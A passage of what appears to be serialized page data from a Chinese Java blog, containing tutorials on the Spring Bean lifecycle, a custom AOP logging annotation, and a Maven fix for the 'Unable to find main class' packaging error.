org.springframework.context.applicationeventpublisher;\nimport org.springframework.context.applicationeventpublisheraware;\nimport org.springframework.stereotype.component;\n \n/**\n * 发布事件\n */\n@component\npublic class extapplicationeventpublisheraware implements applicationeventpublisheraware {\n    @override\n    public void setapplicationeventpublisher(applicationeventpublisher applicationeventpublisher) {\n        system.out.println("发布事件，事件对象为 stringevent ，内容为 ：1234");\n        stringevent stringevent = new stringevent("1234");\n        // 发布事件 ，发布后会在 applicationlistener.onapplicationevent()方法进行捕获；\n        applicationeventpublisher.publishevent(stringevent);  // 发布事件\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n在创建一个事件监听器：  eventlistener.java ，用来监听所有发布的事件；\n\npackage com.spring.boot.init.listener;\n \n \nimport com.spring.boot.init.listener.eventmodel.stringevent;\nimport org.springframework.context.applicationevent;\nimport org.springframework.context.applicationlistener;\nimport org.springframework.stereotype.component;\n \n//事件监听器\n@component\npublic class eventlistener implements applicationlistener<stringevent> {\n \n    @override\n    public void onapplicationevent(stringevent o) {\n        system.out.println("监听到事件，内容："+o.getstr());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n接下来，运行spring项目，看看打印的结果如下，到这里，事件的发布和监听就完成了；\n\n\n\n\n# 6.8 messagesourceaware.setmessagesource()\n\n国际化消息通知操作\n\n\n# 6.9 applicationcontextaware.setapplicationcontext()\n\napplicationcontextaware 主要用来全局获取 applicationcontext 上下文，applicationcontext其实就是容器，为此我们可以实现 applicationcontextaware 接口来获取applicationcontext容器对象；我们可以把它做成一个公共的静态类，这样可以在任意地方想拿就拿了，\n\npackage com.spring.boot.init.aware;\n \nimport org.springframework.beans.beansexception;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.applicationcontextaware;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extapplicationcontextaware implements applicationcontextaware {\n \n    /**\n     * spring容器会在加载完spring容器后调用applicationcontextaware.setapplicationcontext方法\n     * applicationcontextaware 主要用来全局获取 applicationcontext 上下文，\n     */\n \n    private static applicationcontext applicationcontext;\n \n    @override\n    public void setapplicationcontext(applicationcontext applicationcontext) throws beansexception {\n        if (extapplicationcontextaware.applicationcontext == null) {\n            extapplicationcontextaware.applicationcontext = applicationcontext;\n        }\n        system.out.println("========applicationcontext配置成功========");\n        system.out.println("========在普通类可以通过调用springbootbeanutil.getapplicationcontext()获取applicationcontext对象========");\n        system.out.println("========applicationcontext="+ extapplicationcontextaware.applicationcontext +"========");\n    }\n \n    /**\n     * 获取applicationcontext\n     * @return\n     */\n    public static applicationcontext getapplicationcontext() {\n        return applicationcontext;\n    }\n \n    /**\n     * 通过name获取 bean.\n     * @param name\n     * @return\n     */\n    public static object getbean(string name) {\n        return getapplicationcontext().getbean(name);\n    }\n \n    /**\n     * 通过class获取bean.\n     * @param clazz\n     * @return\n     */\n    public static <t> t getbean(class<t> clazz) {\n        return getapplicationcontext().getbean(clazz);\n    }\n \n    /**\n     * 通过name,以及clazz返回指定的bean\n     * @param name\n     * @param clazz\n     * @return\n     */\n    public static <t> t getbean(string name, class<t> clazz) {\n        return getapplicationcontext().getbean(name, clazz);\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n当然，也可以直接注入，就像这样：\n\n @autowired\n private applicationcontext applicationcontext;\n\n\n1\n2\n\n\n\n# 6.10 servletcontextaware.setservletcontext()\n\n通过实现servletcontextaware接口可获取servletcontext，也就是servlet的上下文；\n\n什么是servletcontext ： web容器在启动时，它会为每个web应用程序都创建一个对应的servletcontext对象，它代表当前web应用。servletconfig对象中维护了servletcontext对象的引用，开发人员在编写servlet时，可以通过servletconfig.getservletcontext方法获得servletcontext对象。 由于一个web应用中的所有servlet共享同一个servletcontext对象，因此servlet对象之间可以通过servletcontext对象来实现通讯。servletcontext对象通常也被称之为context域对象。\n\n\n# 6.11 loadtimeweaveraware.setloadtimeweaver()\n\n其实在调试的时候还有2个没打印出来，第11个就是 loadtimeweaver， 简称ltw，ltw是aop的一种实现方式，此方法是为了获取aop织入的对象，使用的织入方式是：类加载期织入， 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是ltw是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法 只有在使用 @enableloadtimeweaving 或者存在 loadtimeweaver 实现的 bean 时才会调用，顺序也很靠后;\n\n\n# 6.12  importaware.setimportmetadata()\n\n还有一个没打印的就是importaware接口，这个接口的方法只有被其他配置类 @import(xx.class) 时才会调用，这个调用对 xx.class 中的所有 @bean 来说顺序是第 1 的。\n\n\n# 7、初始化前置\n\n方法名称： beanpostprocessor.postprocessbeforeinitialization()\n\n在每一个 bean 初始化之前执行的方法（有多少 bean 调用多少次）\n\n注意 ： 启用该方法后，标注了@postconstruct注解的方法会失效\n\n\n# 8、初始化后置\n\n方法名称： beanpostprocessor.postprocessafterinitialization()\n\n在每一个 bean 初始化之后执行的方法（有多少 bean 调用多少次）\n\n初始化前置和初始化后置的实现代码如下\n\npackage com.spring.boot.init;\nimport org.springframework.beans.beansexception;\nimport org.springframework.beans.factory.config.beanpostprocessor;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extbeanpostprocessor implements beanpostprocessor {\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        // 在每一个 bean 初始化之前执行的方法（有多少 bean 调用多少次）\n        // 注意 ： 启用该方法后，标注了@postconstruct注解的方法会失效\n        system.out.println("初始化前置方法");\n        return null;\n    }\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) throws beansexception {\n         在每一个 bean 初始化之后执行的方法（有多少 bean 调用多少次）\n        system.out.println("初始化后置方法");\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 9、执行初始化方法\n\n初始化方法有三个，分别是 添加了@postconstruct 注解的方法、实现initializingbean接口、在@bean注解上添加 initmethod属性；我们一个个讲\n\n\n# 9.1 初始化方法一：@postconstruct\n\n在bean对象内添加@postconstruct 注解后即可实现初始化的功能，被@postconstruct修饰的方法会在构造函数之后，init()方法之前运行。 有多个则会执行多次；\n\n注意： 如果spring 实现了 beanpostprocessor接口的postprocessbeforeinitialization() 方法，也就是12的初始后置方法，那么@postconstruct注解会失效；\n\n代码示例\n\npackage com.spring.boot.init;\nimport org.springframework.stereotype.component;\nimport javax.annotation.postconstruct;\n \n// @postconstruct注解\n@component\npublic class extpostconstruct {\n \n    /**\n     * 被@postconstruct修饰的方法会在构造函数之后，init()方法之前运行。如果有多个则会执行多次\n     * 注意： 如果spring 实现了 beanpostprocessor接口的postprocessbeforeinitialization方法，该@postconstruct注解会失效\n     */\n    @postconstruct\n    public void init() {\n        system.out.println("第一个init...");\n    }\n \n    // 有多个会执行多次\n    @postconstruct\n    public void init1() {\n        system.out.println("第二个init1...");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 9.2 initializingbean.afterpropertiesset()\n\nspring 初始化方法之一，作用是在beanfactory完成属性设置之后,执行自定义的初始化行为。\n\n执行顺序：在initmethod之前执行，在@postconstruct之后执行\n\n代码示例\n\npackage com.spring.boot.init;\nimport org.springframework.beans.factory.initializingbean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.stereotype.component;\n \n@component\npublic class extinitializingbean implements initializingbean {\n    @override\n    public void afterpropertiesset() throws exception {\n        // 一个 initializingbean 执行一次\n        // spring 初始化方法，作用是在beanfactory完成属性设置之后,执行自定义的  初始化行为.\n        // 执行顺序：在initmethod之前执行，在@postconstruct之后执行\n        system.out.println("initializingbean");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 9.3 init-method\n\nbean 配置文件属性 init-method 用于在bean初始化时指定执行方法，用来替代继承 initializingbean接口,\n\n注意的一点是只有一个类完整的实例被创建出来后，才能走初始化方法。\n\n示例代码，先定义一个类： beantest.java ，在类中定义一个初始化方法 initmethod_1()\n\npackage com.spring.boot.init.bean;\n \npublic class beantest {\n    \n    // 将要执行的初始化方法\n    public void initmethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nxml 配置方式\n\n<bean id="beantest" class="com.beantest" init-method="init"></bean> \n\n\n1\n\n\n注解配置方式\n\npackage com.spring.boot.init;\nimport com.spring.boot.init.bean.beantest;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.stereotype.component;\n@component()\npublic class initmethod  {\n    \n    // 在@bean注解上添加initmethod属性，指向类中的 initmethod_1 执行初始化方法\n    @bean(initmethod = "initmethod_1")\n    public beantest getbeantest(){\n        return new beantest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10、使用中\n\n到这一步，bean对象就已经完全创建好了，是一个完整对象了，并且正在被其他对象使用了；\n\n\n# 11、销毁流程\n\n在这里需要先说一下，被spring容器管理的bean默认是单例的，默认在类上面有个 @scope注解，也就是这样的\n\npackage com.spring.boot.init;\n \nimport org.springframework.beans.factory.config.configurablebeanfactory;\nimport org.springframework.context.annotation.scope;\nimport org.springframework.stereotype.component;\n \n@component()\n@scope(value = configurablebeanfactory.scope_singleton)\n// @scope(value = "singleton")  // 也可以这样写\npublic class initmethod  {\n \n  // methods....\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果要设置成多例，只需要把@scope的属性值改一下就行，就像这样，多例模式也叫原型模式，它底层不是重新创建一个bean对象出来，而是使用深拷贝技术实现的，就是复制一个对象出来进行使用\n\n@scope(value = configurablebeanfactory.scope_prototype)\n// @scope(value = "prototype") // 也可以这样写\n\n\n1\n2\n\n\n为什么要介绍单例和多例呢？ 因为啊，销毁流程的走向就跟你是单例还是多例有关；\n\n如果是单例模式，会先执行 disposablebean.destroy()方法，然后在执行 destroy-method 方法；\n\n\n# 11.1  disposablebean.destroy()\n\n单例模式的销毁方式，示例代码\n\npackage com.spring.boot.init.destroy;\n \nimport org.springframework.beans.factory.disposablebean;\nimport org.springframework.stereotype.component;\n \n/**\n * 销毁方法\n */\n@component\npublic class extdisposablebean implements disposablebean {\n    @override\n    public void destroy() throws exception {\n        system.out.println("我被销毁了");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当结束main方法时，控制台打印的结果如下\n\n\n# 11.2  destory-method方法\n\n还是拿 第11 个流程的例子来讲，只不过这次我们在@bean注解里加上 destroymethod属性，指向销毁方法 ：destroymethod_1()\n\npackage com.spring.boot.init;\n \nimport com.spring.boot.init.bean.beantest;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.stereotype.component;\n \n@component()\npublic class initmethod  {\n \n    // 在@bean注解上添加initmethod属性，指向类中的 initmethod_1 执行初始化方法\n    // 在@bean注解上添加destroymethod属性，指向类中的 destroymethod_1 执行销毁方法\n    @bean(initmethod = "initmethod_1",destroymethod = "destroymethod_1")\n    public beantest getbeantest(){\n        return new beantest();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nbeantest.java\n\npackage com.spring.boot.init.bean;\n \npublic class beantest {\n \n    // 将要执行的初始化方法\n    public void initmethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n \n    // 将要执行的销毁方法\n    public void destroymethod_1(){\n        system.out.println("我是beantest的init方法");\n    }\n \n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nxml的配置方式\n\n<bean id="beantest" class="com.beantest" destroy-method="destroymethod_1"></bean>\n\n\n\n1\n2\n\n\n\n# 12、返回bean给用户，剩下的生命周期由用户控制\n\n因为多例模式下，spring无法进行管理，所以将生命周期交给用户控制，用户用完bean对象后，java垃圾处理器会自动将无用的对象进行回收操作；',charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"自定义注解实现 AOP 日志记录",frontmatter:{title:"自定义注解实现 AOP 日志记录",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/718972/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/14.%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0%20AOP%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95.html",relativePath:"04.java/04.spring/14.自定义注解实现 AOP 日志记录.md",key:"v-aab3f59e",path:"/pages/718972/",headersStr:null,content:'> 本文原文地址 blog.csdn.net\n\n 1. 引入 jar 包\n\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-aop</artifactId>\n        </dependency>\n\n\n1\n2\n3\n4\n\n 2. 创建自定义注解\n\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface MyLog {\n\n}\n\n\n1\n2\n3\n4\n5\n\n 3. 定义切面\n\n@Aspect // 1.表明这是一个切面类\n@Component\npublic class MyLogAspect {\n\n    // 2. PointCut表示这是一个切点，@annotation表示这个切点切到一个注解上，后面带该注解的全类名\n    // 切面最主要的就是切点，所有的故事都围绕切点发生\n    // logPointCut()代表切点名称\n    @Pointcut("@annotation(com.example.mimsmes.Service.Report.MyLog)")\n    public void logPointCut(){};\n\n    // 3. 环绕通知\n    @Around("logPointCut()")\n    public void logAround(ProceedingJoinPoint joinPoint){\n        // 获取方法名称\n        String methodName = joinPoint.getSignature().getName();\n        // 获取入参\n        Object[] param = joinPoint.getArgs();\n\n        StringBuilder sb = new StringBuilder();\n        for(Object o : param){\n            sb.append(o + "; ");\n        }\n        System.out.println("进入[" + methodName + "]方法,参数为:" + sb.toString());\n\n        // 继续执行方法\n        try {\n            joinPoint.proceed();\n        } catch (Throwable throwable) {\n            throwable.printStackTrace();\n        }\n        System.out.println(methodName + "方法执行结束");\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 4. 使用注解\n    \n    控制台运行后\n    \n    ',normalizedContent:'> 本文原文地址 blog.csdn.net\n\n 1. 引入 jar 包\n\n<dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-aop</artifactid>\n        </dependency>\n\n\n1\n2\n3\n4\n\n 2. 创建自定义注解\n\n@target(elementtype.method)\n@retention(retentionpolicy.runtime)\npublic @interface mylog {\n\n}\n\n\n1\n2\n3\n4\n5\n\n 3. 定义切面\n\n@aspect // 1.表明这是一个切面类\n@component\npublic class mylogaspect {\n\n    // 2. pointcut表示这是一个切点，@annotation表示这个切点切到一个注解上，后面带该注解的全类名\n    // 切面最主要的就是切点，所有的故事都围绕切点发生\n    // logpointcut()代表切点名称\n    @pointcut("@annotation(com.example.mimsmes.service.report.mylog)")\n    public void logpointcut(){};\n\n    // 3. 环绕通知\n    @around("logpointcut()")\n    public void logaround(proceedingjoinpoint joinpoint){\n        // 获取方法名称\n        string methodname = joinpoint.getsignature().getname();\n        // 获取入参\n        object[] param = joinpoint.getargs();\n\n        stringbuilder sb = new stringbuilder();\n        for(object o : param){\n            sb.append(o + "; ");\n        }\n        system.out.println("进入[" + methodname + "]方法,参数为:" + sb.tostring());\n\n        // 继续执行方法\n        try {\n            joinpoint.proceed();\n        } catch (throwable throwable) {\n            throwable.printstacktrace();\n        }\n        system.out.println(methodname + "方法执行结束");\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 4. 使用注解\n    \n    控制台运行后\n    \n    ',charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma",frontmatter:{title:"Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/36cb7f/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/15.Spring%20boot%20%E9%A1%B9%E7%9B%AE%20maven%20%E5%A4%9A%E6%A8%A1%E5%9D%97%E6%89%93%E5%8C%85%20%E5%AD%90%E6%A8%A1%E5%9D%97%E6%8A%A5%E9%94%99%20Unable%20to%20find%20ma.html",relativePath:"04.java/04.spring/15.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.md",key:"v-d2e6b59a",path:"/pages/36cb7f/",headersStr:null,content:"> 本文参考文章地址 https://www.zjh336.cn/?id=234\n\n错误：\n\n\n\nUnable to find main class  \n\n\n1\n\n\n原来 spring boot 项目使用 maven 打包，如果没有做配置的话，会自动寻找签名是 public static void main(String[] args) 的方法。而配置项是什么呢？\n\n<plugin>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-maven-plugin</artifactId>\n</plugin>\n\n\n1\n2\n3\n4\n\n\nservice 模块只是个服务工程，本来就没有入口 class。那该如何设置呢？\n\n其实很简单，只需要在 service 模块中添加：\n\n<plugin>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-maven-plugin</artifactId>\n\t<configuration>\n\t\t<skip>true</skip>\n\t</configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置添加，设置过滤即可。",normalizedContent:"> 本文参考文章地址 https://www.zjh336.cn/?id=234\n\n错误：\n\n\n\nunable to find main class  \n\n\n1\n\n\n原来 spring boot 项目使用 maven 打包，如果没有做配置的话，会自动寻找签名是 public static void main(string[] args) 的方法。而配置项是什么呢？\n\n<plugin>\n\t<groupid>org.springframework.boot</groupid>\n\t<artifactid>spring-boot-maven-plugin</artifactid>\n</plugin>\n\n\n1\n2\n3\n4\n\n\nservice 模块只是个服务工程，本来就没有入口 class。那该如何设置呢？\n\n其实很简单，只需要在 service 模块中添加：\n\n<plugin>\n\t<groupid>org.springframework.boot</groupid>\n\t<artifactid>spring-boot-maven-plugin</artifactid>\n\t<configuration>\n\t\t<skip>true</skip>\n\t</configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置添加，设置过滤即可。",charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:41:23",lastUpdatedTimestamp:1653979283e3},{title:"Spring IOC详解 以及 Bean生命周期详细过程",frontmatter:{title:"Spring IOC详解 以及 Bean生命周期详细过程",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/9ed795/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/16.Spring%20IOC%E8%AF%A6%E8%A7%A3%20%E4%BB%A5%E5%8F%8A%20Bean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B.html",relativePath:"04.java/04.spring/16.Spring IOC详解 以及 Bean生命周期详细过程.md",key:"v-9c711b94",path:"/pages/9ed795/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:2},{level:2,title:"spring ioc的加载过程",slug:"spring-ioc的加载过程",normalizedTitle:"spring ioc的加载过程",charIndex:448},{level:2,title:"Spring Bean的生命周期",slug:"spring-bean的生命周期",normalizedTitle:"spring bean的生命周期",charIndex:1877},{level:3,title:"1、实例化前置",slug:"_1、实例化前置",normalizedTitle:"1、实例化前置",charIndex:3538},{level:3,title:"2、实例化对象",slug:"_2、实例化对象",normalizedTitle:"2、实例化对象",charIndex:3996},{level:3,title:"3、实例化后置",slug:"_3、实例化后置",normalizedTitle:"3、实例化后置",charIndex:4097},{level:3,title:"4、属性修改",slug:"_4、属性修改",normalizedTitle:"4、属性修改",charIndex:4466},{level:3,title:"5、给用户属性赋值",slug:"_5、给用户属性赋值",normalizedTitle:"5、给用户属性赋值",charIndex:4731},{level:3,title:"6、给容器属性赋值",slug:"_6、给容器属性赋值",normalizedTitle:"6、给容器属性赋值",charIndex:4923},{level:3,title:"6.1  BeanNameAware.setBeanName()",slug:"_6-1-beannameaware-setbeanname",normalizedTitle:"6.1  beannameaware.setbeanname()",charIndex:9223},{level:3,title:"6.2  BeanClassLoaderAware.setBeanClassLoader()",slug:"_6-2-beanclassloaderaware-setbeanclassloader",normalizedTitle:"6.2  beanclassloaderaware.setbeanclassloader()",charIndex:9330},{level:3,title:"6.3 BeanFactoryAware.setBeanFactory()",slug:"_6-3-beanfactoryaware-setbeanfactory",normalizedTitle:"6.3 beanfactoryaware.setbeanfactory()",charIndex:9395},{level:3,title:"6.4 EnvironmentAware.setEnvironment()",slug:"_6-4-environmentaware-setenvironment",normalizedTitle:"6.4 environmentaware.setenvironment()",charIndex:9590},{level:3,title:"6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver()",slug:"_6-5-embeddedvalueresolveraware-setembeddedvalueresolver",normalizedTitle:"6.5  embeddedvalueresolveraware.setembeddedvalueresolver()",charIndex:9729},{level:3,title:"6.6 ResourceLoaderAware.setResourceLoader()",slug:"_6-6-resourceloaderaware-setresourceloader",normalizedTitle:"6.6 resourceloaderaware.setresourceloader()",charIndex:10201},{level:3,title:"6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()；",slug:"_6-7-applicationeventpublisheraware-setapplicationeventpublisher",normalizedTitle:"6.7 applicationeventpublisheraware.setapplicationeventpublisher()；",charIndex:10993},{level:3,title:"6.8 MessageSourceAware.setMessageSource()",slug:"_6-8-messagesourceaware-setmessagesource",normalizedTitle:"6.8 messagesourceaware.setmessagesource()",charIndex:13344},{level:3,title:"6.9 ApplicationContextAware.setApplicationContext()",slug:"_6-9-applicationcontextaware-setapplicationcontext",normalizedTitle:"6.9 applicationcontextaware.setapplicationcontext()",charIndex:13401},{level:3,title:"6.10 ServletContextAware.setServletContext()",slug:"_6-10-servletcontextaware-setservletcontext",normalizedTitle:"6.10 servletcontextaware.setservletcontext()",charIndex:15894},{level:3,title:"6.11 LoadTimeWeaverAware.setLoadTimeWeaver()",slug:"_6-11-loadtimeweaveraware-setloadtimeweaver",normalizedTitle:"6.11 loadtimeweaveraware.setloadtimeweaver()",charIndex:16310},{level:3,title:"6.12  ImportAware.setImportMetadata()",slug:"_6-12-importaware-setimportmetadata",normalizedTitle:"6.12  importaware.setimportmetadata()",charIndex:16604},{level:2,title:"7、初始化前置",slug:"_7、初始化前置",normalizedTitle:"7、初始化前置",charIndex:16749},{level:2,title:"8、初始化后置",slug:"_8、初始化后置",normalizedTitle:"8、初始化后置",charIndex:16897},{level:2,title:"9、执行初始化方法",slug:"_9、执行初始化方法",normalizedTitle:"9、执行初始化方法",charIndex:17868},{level:3,title:"9.1 初始化方法一：@PostConstruct",slug:"_9-1-初始化方法一-postconstruct",normalizedTitle:"9.1 初始化方法一：@postconstruct",charIndex:17973},{level:3,title:"9.2 InitializingBean.afterPropertiesSet()",slug:"_9-2-initializingbean-afterpropertiesset",normalizedTitle:"9.2 initializingbean.afterpropertiesset()",charIndex:18850},{level:3,title:"9.3 init-method",slug:"_9-3-init-method",normalizedTitle:"9.3 init-method",charIndex:19589},{level:2,title:"10、使用中",slug:"_10、使用中",normalizedTitle:"10、使用中",charIndex:20482},{level:2,title:"11、销毁流程",slug:"_11、销毁流程",normalizedTitle:"11、销毁流程",charIndex:20538},{level:3,title:"11.1  DisposableBean.destroy()",slug:"_11-1-disposablebean-destroy",normalizedTitle:"11.1  disposablebean.destroy()",charIndex:21321},{level:3,title:"11.2  destory-method方法",slug:"_11-2-destory-method方法",normalizedTitle:"11.2  destory-method方法",charIndex:21773},{level:2,title:"12、返回bean给用户，剩下的生命周期由用户控制",slug:"_12、返回bean给用户-剩下的生命周期由用户控制",normalizedTitle:"12、返回bean给用户，剩下的生命周期由用户控制",charIndex:22852}],headersStr:"Spring IOC spring ioc的加载过程 Spring Bean的生命周期 1、实例化前置 2、实例化对象 3、实例化后置 4、属性修改 5、给用户属性赋值 6、给容器属性赋值 6.1  BeanNameAware.setBeanName() 6.2  BeanClassLoaderAware.setBeanClassLoader() 6.3 BeanFactoryAware.setBeanFactory() 6.4 EnvironmentAware.setEnvironment() 6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver() 6.6 ResourceLoaderAware.setResourceLoader() 6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()； 6.8 MessageSourceAware.setMessageSource() 6.9 ApplicationContextAware.setApplicationContext() 6.10 ServletContextAware.setServletContext() 6.11 LoadTimeWeaverAware.setLoadTimeWeaver() 6.12  ImportAware.setImportMetadata() 7、初始化前置 8、初始化后置 9、执行初始化方法 9.1 初始化方法一：@PostConstruct 9.2 InitializingBean.afterPropertiesSet() 9.3 init-method 10、使用中 11、销毁流程 11.1  DisposableBean.destroy() 11.2  destory-method方法 12、返回bean给用户，剩下的生命周期由用户控制",content:'# Spring IOC\n\n首先，在此之前，我们就必须先知道什么是ioc，ioc叫做控制反转，也可以称为依赖注入（DI），实际上依赖注入是ioc的另一种说法，\n\n 1. 谁控制谁？：在以前，对象的创建和销毁都是由用户控制的，用了ioc之后，对象的创建和销毁就都交给容器来控制了，用户就不用管这些，只关注业务需求就好了；\n\n 2. 什么是反转？：既然叫反转，肯定就有正转，正转其实就是对象去找实例，而反转就反过来了嘛，让实例来找对象；怎么找呢？当然是通过容器啦！\n    \n    \n\n 3. 谁依赖谁？：在spring项目中，将对象理解为Bean，也可以叫bean对象，这个bean和容器之间有个依赖关系，bean对象的创建是依赖容器的，就好像孩子依赖父母一样，孩子不能自己生出自己，需要父母的合作才能出生，这里的孩子就是bean，父母就是容器；\n\n 4. 谁注入谁？：通过容器注入了bean对象，而且这个过程是自动化的，也就是说容器会自动找到和bean对象匹配的类型实例注入到对象中；\n\n\n# spring ioc的加载过程\n\n了解完控制反转和依赖注入，接下来我们在看看ioc的加载过程，ioc的整个加载过程如下图，先看看大致的流程，然后再慢慢深入 （其中黄色的框内是注释内容）\n\n\n\n1、首先，通过BeanDefinitionReader 读取指定的配置文件生成bean的定义信息，然后到完整的bean定义信息(BeanDefinition对象)，注意这里只是存储bean的定义信息，还没有实例化bean对象；就像工厂里面一样，原材料已经准备好了，但是还没有进行生产，原材料就是beanDefinition，生产就是实例化\n\n2、在 BeanDefinition 和 完整BeanDefinition 中间通过一个后置增强器，可以对bean的定义信息进行统一修改，只需要实现 BeanFactoryPostProcessor 接口即可，这个后置增强器是可以有多个的，你只要在不同的类实现多个 BeanFactoryPostProcessor 接口就会执行多次，就像这样：\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.BeanFactoryPostProcessor;\nimport org.springframework.beans.factory.config.ConfigurableListableBeanFactory;\nimport org.springframework.stereotype.Component;\n/**\n * 扩展方法--后置增强器（可修改bean的定义信息）\n */\n@Component\npublic class ExtBeanFactoryPostProcessor implements BeanFactoryPostProcessor {\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n//        BeanDefinition studentService = beanFactory.getBeanDefinition("studentService");\n        System.out.println("扩展方法--可进行修改beanDefinition的定义信息");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n3、得到 完整BeanDefinition 之后就可以进行创建对象了，这整个过程被称为 bean 的生命周期，也就是从实例化到销毁的过程；那么这时候爱学习童鞋就要发问了：“对象创建和销毁有这么麻烦嘛？直接反射实例化一个对象不就行了嘛？为啥还有初始化？”； 首先，这是个好问题，来，我们先把掌声送给这位发问的同学；我想说的是，就算是普通的new一个对象出来，里面也会经过实例化和初始化，有兴趣的话请看我的另一篇文章 ： java创建对象过程 实例化和初始化； 接下来我们重点讲bean的生命周期;\n\n\n# Spring Bean的生命周期\n\n粗略来看，bean的生命周期主要分为以下4个步骤\n\n\n\n但其实，它的内部蕴含了很多东西，让我们看看细化后的流程图；\n\n\n\n怎么样？ 是不是看到了很多没见过的东西？好像认识几个，但大多都是没见过的东东，不知道不要紧，接下来我们一个个地讲解\n\n接下来我们要将1、3、4 放到一起讲，是因为它们是在同一个接口里面的，实现 InstantiationAwareBeanPostProcessor 接口即可\n\npackage com.Spring.Boot.init;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.InstantiationAwareBeanPostProcessor;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class MyInstantiationAwareBeanPostProcessor implements InstantiationAwareBeanPostProcessor {\n \n    // 实例化前置\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        \n        System.out.println("postProcessBeforeInstantiation被调用了----在对象实例化之前调用-----beanName:" + beanName);\n        // 默认什么都不做，返回null\n        return null;\n    